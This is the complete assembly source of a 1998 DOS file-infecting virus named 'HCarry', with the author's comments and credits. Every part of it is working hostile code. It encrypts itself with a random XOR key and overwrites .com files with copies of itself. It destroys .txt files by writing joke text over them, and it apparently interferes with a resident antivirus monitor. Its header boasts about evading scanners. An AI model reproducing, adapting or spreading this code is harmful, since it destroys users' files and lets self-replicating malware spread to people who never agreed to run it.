;This is the HCarry Virus
;dedicated to the late Harry Carry
;The only AV scanner that I know of that detects this virus is TBAV Scanner
start:             ;start of virus!

lea si, crypt_start
mov di,si
mov cx,end - crypt_start
call crypt

jmp crypt_start

xor_value db 0

crypt:
lodsb
xor al,byte ptr [xor_value]
stosb
loop crypt
ret

crypt_start:
mov ah,9           ;print string to screen
lea dx,textmask
int 21h            ;go do it dos!

mov ax,0fa02
push   ax
mov bl,0
mov  dx,05945
push  dx
int 016
push cx

mov ah,4eh         ;find first file
lea dx,filemask    ;put the kind of file we want to find first in dx
xor cx,cx          ;clears the cx register to 0

find_next:         ;label for the find next rountine
int 21h            ; go do it!
jnc infect         ;jump if a file is found, if not continue jnc=jump
jmp text           ;if carry flag isn't set



infect:            ;here is our infect rountine, where we go when we find a file to kill
mov ax,3d02h       ; open file for read/write access (00=read
                   ;01=write 02=read/write)
mov dx, 9eh        ;get file info
int 21h            ;now!~
mov bx,ax          ;move info form bx register in ax

in al,40h
mov byte ptr [xor_value],al

mov ah,40h
lea dx,start
mov cx,crypt_start - start
int 21h

lea si,crypt_start
lea di,end
mov cx,end - crypt_start
call crypt

mov ah,40h               ;40hex write to file
mov cx,end - crypt_start ; heres the length of what we want to write
lea dx,end               ;and heres where to start
int 21h                  ; go!
mov ah,3eh               ;close the file up
int 21h                  ;now!
mov ah,4fh               ;find next file!
jmp find_next            ;continue!

text:
mov ah,4eh
lea dx,textfile
int 21h
jnc text_pload
jmp close

text_pload:
mov  ax,3d02h
mov  dx,9eh
int  21h
mov  ah,40h
mov  cx,pload_end - pload_start
lea  dx,pload_start
int  21h
jmp text_findnext

text_findnext:
mov ah,4fh
int  21h
jnc  text_pload
jmp close

pload_start:
db 'HOLY COW!',10,13,
db '---',10,13,
db 'Whats your favorite planet?...Mines the SUN!',10,13,
db 'One time i studied it for a whole hour i almost went BLIND!',10,13,
db '---',10,13,
db 'Hey!....Whats goin.....Hey!',10,13,
db '---',10,13,
db 'Now just for some silly crap!',10,13,
db 'FLOCK!',10,13,
db 'Hehehehe Look At YOU!',10,13,
db 'Back to the Computer Store for you!',10,13,
db 'This is HORRRIBLE!'
db 'Who would do something like this?',10,13,
db 'MY LEG DOESNT BEND THAT WAY!',10,13,
db 'MOCB',10,13,
db 'This Virus has infected this file if you havnt found that out yet!',10,13,
db 'Please insert 25 cents!',10,13,
db 'DO DO DO Were Sorry your call did not go threw please hang up and try again',10,13,
db 'JERRY JERRY JERRY JERRY JERRY JERRY',10,13,
db 'Jerry Springer to HOT for Television',10,13,
db 'DOH!',10,13,
pload_end:

close:
int 20h            ;exit program
                   ;this next portion is the datasegment which the virus refers to for
                   ;the variable we give it
                   ;Thank you to Spo0ky,<-OPIC->,and Arsonic for helping me!
         textfile db '*.txt',0   ;find .txt files
         filemask db '*.com',0   ;the kinds of files we want
         textmask db 'This file is now infected!',10,13,
                  db 'By The HCarry virus!',10,13,
                  db 'MoCBDUKE[Codebreaker, 1998]',10,13,'$'
end:





